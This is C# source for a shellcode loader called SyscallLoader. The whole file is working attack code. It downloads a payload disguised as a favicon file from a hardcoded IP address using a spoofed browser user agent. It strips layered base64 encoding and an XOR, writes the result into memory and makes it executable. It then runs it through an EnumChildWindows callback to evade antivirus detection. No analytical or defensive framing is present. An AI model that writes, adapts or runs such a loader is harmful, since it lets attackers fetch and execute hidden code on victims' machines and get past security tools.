using System;
using System.Net;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using static SyscallLoader.Sys;

namespace SyscallLoader
{
    class Program
    {
        public delegate IntPtr Vt(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate IntPtr Em(IntPtr hWndParent, IntPtr lpEnumFunc, int lParam);

        static void Main(string[] args)
        {

            string datas = string.Empty;
            string url = "http://172.17.120.67:20045/favicon32.ico";
            try
            {
                HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
                request.Timeout = 30 * 100;
                Encoding encoding = Encoding.UTF8;
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36";
                using (HttpWebResponse httpWebResponse = request.GetResponse() as HttpWebResponse)
                {
                    StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), encoding);
                    datas = streamReader.ReadToEnd();
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
            char[] res = datas.ToCharArray();
            Array.Reverse(res);
            datas = new string(res);
            byte[] s = Convert.FromBase64String(Encoding.Default.GetString(Convert.FromBase64String(Encoding.Default.GetString(Convert.FromBase64String(datas)))));
            for (int i = 0; i < s.Length; i++)
            {
                s[i] ^= 0xf;
            }
            IntPtr hProcess = IntPtr.Zero - 1;
            IntPtr pMemoryAllocation = new IntPtr();
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(s.Length));
            uint allocationType = Commit | Reserve;
            uint protection = PAGE_READWRITE;
            NtAllocateVirtualMemory(hProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            Marshal.Copy(s, 0, (IntPtr)(pMemoryAllocation), s.Length);
            IntPtr p = LoadLibrary("kernel32.dll");
            Vt addr = (Vt)Getaddr(p, "VirtualProtect", typeof(Vt));
            addr(pMemoryAllocation, (UInt32)s.Length, PAGE_EXECUTE, out dwOldProtect);
            IntPtr E = LoadLibrary("user32.dll");
            Em EM = (Em)Getaddr(E, "EnumChildWindows", typeof(Em));
            EM(IntPtr.Zero, pMemoryAllocation, 0);
            FreeLibrary(p);

        }


        public static Delegate Getaddr(IntPtr m, string Name, Type t)
        {

            IntPtr Address = GetProcAddress(m, Name);

            return Marshal.GetDelegateForFunctionPointer(Address, t);
        }


        private static uint PAGE_READWRITE = 0x00000004;
        private static uint PAGE_EXECUTE = 0x00000010;
        private static uint Reserve = 0x2000;
        private static uint Commit = 0x1000;
        private static uint dwOldProtect = (uint)new IntPtr();
        [DllImportAttribute("kernel32.dll", EntryPoint = "GetProcAddress")]
        public static extern IntPtr GetProcAddress([InAttribute()] IntPtr hModule, [System.Runtime.InteropServices.InAttribute()][System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.LPStr)] string lpProcName);

        [DllImportAttribute("kernel32.dll", EntryPoint = "LoadLibrary")]
        public static extern System.IntPtr LoadLibrary(string lpLibFileName);
        [DllImportAttribute("kernel32.dll", EntryPoint = "FreeLibrary")]
        public static extern bool FreeLibrary(IntPtr hLibModule);

    }
}
